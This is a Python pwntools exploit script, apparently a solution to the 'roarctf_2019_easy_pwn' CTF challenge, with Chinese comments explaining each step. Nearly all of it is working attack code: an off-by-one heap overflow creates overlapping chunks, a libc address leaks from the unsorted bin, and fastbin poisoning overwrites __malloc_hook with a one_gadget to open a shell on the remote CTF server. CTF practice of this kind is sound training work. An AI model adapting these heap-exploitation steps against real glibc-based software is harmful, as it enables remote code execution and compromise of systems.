from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './roarctf_2019_easy_pwn'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',26822) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so"})
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so')
#patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./roarctf_2019_easy_pwn

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len):
    sla(b'choice: ',b'1')
    sla(b'size:',int2bytes(len))
    # sa(b':',content)

def show(index):
    sla(b'choice: ',b'4')
    sla(b':',int2bytes(index))

def edit(index,size, content):
	sla(b'choice: ',b'2')
	sla(b':',int2bytes(index))
	sla(b':', int2bytes(size))
	sa(b':',content)

def delete(index):
    sla(b'choice: ',b'3')
    sla(b':',int2bytes(index))


one_gadgets = [0x45216, 0x4526a, 0xf1147, 0xf02a4]

add(0x18)#0
add(0x10)#1
add(0x90)#2
add(0x10)#3

payload = b'a'*0x10+p64(0x20)+p8(0xa1)
edit(0,0x18+10,payload)

payload = b'a'*0x70 + p64(0xa0) + p64(0x21) #测一下这个0x21有必要吗
edit(2,0x80,payload)#绕过检测，即下一个chunk的pre_size和当前chunk的size相等

delete(1)
add(0x90)#1 此时chunk1和chunk2发生重叠

payload = p64(0)*2 + p64(0) + p64(0xa1)
edit(1,0x20,payload)#因为calloc会将原来chunk内容置零，故需要恢复chunk2的内容

delete(2)
show(1)
ru(b"content: ")
r(0x20)
libc_base = uu64(r(6))-0x3c4b78 #unsorted_bin距离libc基址的距离
print("libc_base:"+hex(libc_base))
malloc_hook=libc_base+libc.sym['__malloc_hook']
realloc_hook = libc_base + libc.symbols['realloc']

add(0x80)#2——刚刚为了泄露libc，把chunk2释放到unsorted_bin了，现在申请回来
payload = p64(0)*2 + p64(0) + p64(0x71) + b'a' * 0x60 + p64(0x70) + p64(0x21)
edit(1,0x90,payload)#首先0x71覆盖0x91是为了得到malloc_hook-0x23处的fake_chunk一个大小
#其次，后面则是类似上面的绕过检测，即下一个chunk的pre_size和当前chunk的size相等
#测一下这个0x21有必要吗

delete(2)
payload = p64(0)*2 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
edit(1,len(payload),payload)

add(0x60)#2
add(0x60)#4 -- fake chunk
one_gadget = one_gadgets[2]+libc_base
payload = b'a'*(0x13 - 8) + p64(one_gadget) + p64(realloc_hook+4)
# one_gadget = one_gadgets[1]+libc_base
# payload = b'a'*(0x13 - 8) + p64(one_gadget) + p64(realloc_hook+16)
# 看了两个wp这两种one_gadget都可以
edit(4,len(payload),payload)
add(0x60)
itr()